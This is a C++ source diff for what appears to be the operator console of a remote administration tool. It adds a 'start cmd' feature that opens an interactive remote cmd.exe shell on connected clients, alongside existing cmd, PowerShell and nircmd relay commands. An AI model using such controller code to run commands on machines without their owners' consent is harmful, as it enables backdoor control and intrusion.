@@ -51,8 +51,7 @@ void disp_connection(Connection c);
 void ShowCursor(bool show);
 void clear();
 void display_banner();
-int optVal;
-int optLen = sizeof(int);
+void start(string type);
 int clear_count = 0;
 int auto_clear_thrs = 3;
 void execute_cmd(string command);
@@ -86,7 +85,8 @@ map<string, function<void(paramType)>> function_connected = {
 	{"tsend", [](paramType x) {send_message(x); }},
 	{"cmd",[](paramType x) {execute_cmd(x); }},
 	{"ps", [](paramType x) {execute_ps(x); }},
-	{"nircmd", [](paramType x) {execute_nir(x); }}
+	{"nircmd", [](paramType x) {execute_nir(x); }},
+	{"start", [](paramType x) {start(x); }}
 };
 
 int main()
@@ -98,122 +98,6 @@ int main()
 	while (true) {
 		commandline();
 	}
-	/*while (true) {
-		change_color(7);
-		string input, parameter, function;
-		cout << prefix << " ~ $ ";
-		getline(cin, input);
-		if (input.empty()) {
-			cout << "syntax: can't be empty" << endl;
-			continue;
-		}
-		auto command = input.find(" ");
-		if (command != string::npos && command != 0) { //finds space between function and parameter
-			//cout << endl << "|" << input.substr(0, command) << "| |" << input.substr(command+1) << "|" << endl;
-			function = input.substr(0, command);
-			parameter = input.substr(command+1);
-		}
-		else { // assumes to only call function without parameter
-			function = input.substr(0, command);
-			parameter = "";
-		}
-
-		if (function_map<decltype(function)>.find(function) != function_map<decltype(function)>.end()) {
-			function_map<decltype(function)>[function](parameter);
-		}
-		else {
-			cout << "'" << function << "' is not a recognized command. ";
-			string query;
-			vector<string> potential_string;
-			vector<int> potestial_int;
-			for (auto c : function) {
-				query += c;
-				int count = 0;
-				for (auto f : function_map<decltype(function)>) {
-					if (f.first.find(query) != string::npos) {
-						count++;
-						potential_string.push_back(f.first);
-					}
-				}
-				if (count > 0) {
-					potestial_int.push_back(count);
-				}
-			}
-			if (!(potential_string.empty()) && !(potestial_int.empty())) {
-				cout << "Did you mean [";
-				for (int i = 1; i <= potestial_int.back(); i++) {
-					cout << "\""<< potential_string[potential_string.size() - i] << "\"" << " or ";
-				}
-				cout << "\b\b\b\b] ?" << endl;
-			}
-			else {
-				cout << endl;
-			}
-		}
-	}
-
-	//cout << funcMap<int>.count("add") << endl;
-	//cout << funcMap["addd"](1, 2) << endl;
-	//cout << funcMap<int>["sub"](3, 1) << endl;
-	//cout << funcMap<int>["mul"](3, 3) << endl;
-	//thread client_handler(connection_handler, ref(global_set), 1337, ref(listening_socket));
-	//client_handler.detach();
-	while (true) {
-		if (got_connection) {
-			if (connected)
-			{
-			}
-			else {
-				cout << "Number of connected clients: " << m_connect.size() << endl;
-			}
-			Sleep(1000);
-			string input, socket, command;
-
-			//clear();
-			cout << "---- SOCKET LIST ----";
-			for (auto i = m_connect.begin(); i != m_connect.end(); i++) {
-				disp_connection(*i);
-			}
-			cout << "[" << hostname << "]~ ";
-			getline(cin, input);
-
-			auto msg_check = input.find('!');
-			auto cmd_check = input.find(':');
-			auto sud_check = input.find("::");
-			if (msg_check != string::npos && msg_check == 5) { //MSG
-				//cout << input.substr(0, msg_check) << "|" << input.substr(msg_check);
-				socket = input.substr(0, msg_check);
-				command = input.substr(msg_check);
-			}
-			else if (cmd_check != string::npos &&  cmd_check == 5) { //COMMAND
-				//cout << input.substr(0, cmd_check) << "|" << input.substr(cmd_check);
-				socket = input.substr(0, cmd_check);
-				command = input.substr(cmd_check);
-			}
-			else if (sud_check != string::npos &&  sud_check == 5) { //SUDO COMMAND
-				//cout << input.substr(0, sud_check) << input.substr(sud_check);
-				socket = input.substr(0, sud_check);
-				command = input.substr(sud_check);
-			}
-			else { //INVALID INPUT
-				cout << endl;
-				cout_error("Syntax", "INVALID INPUT");
-				continue;
-			}
-			auto send_command = send(find_struct(m_connect, socket).active_socket, command.c_str(), command.size(), 0);
-			if (send_command != SOCKET_ERROR) {
-				cout << endl;
-				cout_green("SENT", command.substr(1));
-				cout << endl;
-			}
-			else {
-				cout << endl;
-				cout_error("SEND_ERROR", to_string(WSAGetLastError()));
-				cout << endl;
-			}
-			//send(m_connect[socket].active_socket, input.c_str(), input.size(), 0);
-		}
-	}*/
 }
 
 bool check_error(int status) {
@@ -243,7 +127,7 @@ void display_banner() {
 	R"(   _/        _/          _/        _/    _/  _/    _/      _/          )",
 	R"(    _/_/_/  _/_/_/_/  _/_/_/      _/    _/  _/    _/      _/           )"
 	};
-	SetCaretBlinkTime(100);
+	SetCaretBlinkTime(500);
 	cout << endl;
 	for (auto i : banner) {
 		for (auto c : i) {
@@ -300,7 +184,7 @@ void ShowCursor(bool show) {
 		&structCursorInfo);
 }
 
-void execute_cmd(string command) { 
+void execute_cmd(string command) {
 	send_msg(command, "CMDO");
 	string type, data;
 	cout << "cmd.exe output for \"" << command << "\"" << endl;
@@ -344,7 +228,7 @@ void execute_nir(string command)
 	string data, type;
 	recv_data(type, data);
 	if (type == "NIRB") {
-		cout << "("<< data << ")" << endl;
+		cout << "(" << data << ")" << endl;
 	}
 }
 
@@ -414,7 +298,6 @@ void disconnect(string command) {
 				if (verbose) {
 					cout << "Disconnected Socket (" << subject.socket_number << ")" << endl;
 				}
-
 			}
 		}
 		else {
@@ -424,7 +307,6 @@ void disconnect(string command) {
 
 			return;
 		}
-
 	}
 	else if (is_unique(command)) {
 		Connection subject = find_struct(m_connect, command);
@@ -434,7 +316,6 @@ void disconnect(string command) {
 			if (verbose) {
 				cout << "Disconnected (" << command << ")" << endl;
 			}
-
 		}
 		else {
 			return;
@@ -484,7 +365,6 @@ void connect(string command) {
 			if (verbose) {
 				cout << "Connected to [\"" << subject.unique_name << "\"] - > (" << subject.socket_number << ")" << endl;
 			}
-
 		}
 	}
 	else if (is_unique(command)) {
@@ -663,7 +543,6 @@ void commandline() {
 	auto command = input.find(" ");
 	if (command != string::npos && command != 0) { //finds space between function and parameter
 		clear_count = 0;
-		//cout << endl << "|" << input.substr(0, command) << "| |" << input.substr(command+1) << "|" << endl;
 		function = input.substr(0, command);
 		parameter = input.substr(command + 1);
 	}
@@ -756,6 +635,33 @@ void help(string command) {
 		}
 		else {
 			cout << "Error: Could not find help file of the command '" << command << "'" << endl;
+		}
+	}
+}
+
+void start(string type) {
+	if (type == "cmd") {
+		send_msg(" ", "CMDS");
+		string start_t, start_d;
+		while (start_t != "CMDE") {
+			recv_data(start_t, start_d);
+			cout << start_d;
+		}
+		string output_l, type_l;
+		while (type_l != "CMDK") {
+			cout << start_d << "\b";
+			string command;
+			getline(cin, command);
+			if (command.empty()) {
+				send_msg(" ", "CMDC");
+			}
+			else {
+				send_msg(command, "CMDC");
+			}
+			while (type_l != "CMDE") {
+				recv_data(type_l, output_l);
+				cout << output_l;
+			}
 		}
 	}
 }
